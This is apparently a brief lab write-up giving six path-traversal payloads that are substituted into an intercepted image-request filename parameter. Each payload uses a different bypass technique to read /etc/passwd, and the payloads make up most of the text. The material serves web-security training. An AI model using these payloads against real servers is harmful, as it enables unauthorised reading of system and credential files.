# Path Traversal

### Lab 1: File path traversal, simple case.
- Open any image in the web page and intercept the request using `BurpSuite's Proxy`
- Change the filename parameter to `../../../etc/passwd`

### Lab 2: File path traversal, traversal sequences blocked with absolute path bypass.
- Open any image in the web page and intercept the request using `BurpSuite's Proxy`
- Change the filename parameter to `/etc/passwd`

### Lab 3: File path traversal, traversal sequences stripped non-recursively.
- Open any image in the web page and intercept the request using `BurpSuite's Proxy`
- Change the filename parameter to `....//....//....//etc/passwd`

### Lab 4: File path traversal, traversal sequences stripped with superfluous URL-decode.
- Open any image in the web page and intercept the request using `BurpSuite's Proxy`
- Change the filename parameter to `..%252f..%252f..%252fetc/passwd`

### Lab 5: File path traversal, validation of start of path.
- Open any image in the web page and intercept the request using `BurpSuite's Proxy`
- Change the filename parameter to `/var/www/images/../../../etc/passwd`

### Lab 6: File path traversal, validation of file extension with null byte bypass.
- Open any image in the web page and intercept the request using `BurpSuite's Proxy`
- Change the filename parameter to `../../../etc/passwd%00.jpg`